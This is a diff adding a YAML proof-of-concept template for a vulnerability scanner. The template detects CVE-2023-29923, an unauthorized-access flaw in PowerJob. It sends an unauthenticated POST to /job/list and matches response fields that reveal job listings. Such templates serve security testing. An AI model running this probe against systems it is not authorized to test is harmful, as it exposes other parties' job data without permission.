@@ -1,0 +1,27 @@
+id: poc-yaml-powerjob-list-unauthorized-access
+info:
+  name: PowerJob list 未授权访问漏洞(CVE-2023-29923)
+  severity: medium
+  tags:
+  - CVE-2023-29923
+  - 两高一弱
+  finger: PowerJob
+requests:
+- method: POST
+  path: /job/list
+  headers:
+    Content-Type: application/json
+  data: '{"appId":1,"index":0,"pageSize":10}
+
+    '
+  expression: 'status_code == 200
+
+    && (contains(body,"\"success\":true")
+
+    && contains(body,"jobName")
+
+    && contains(body,"\"timeExpressionType\":\"API\"") ) || contains(body, `{"success":true,"data":{"index":0,"pageSize":10`)
+
+    '
+variables: {}
+transport: http
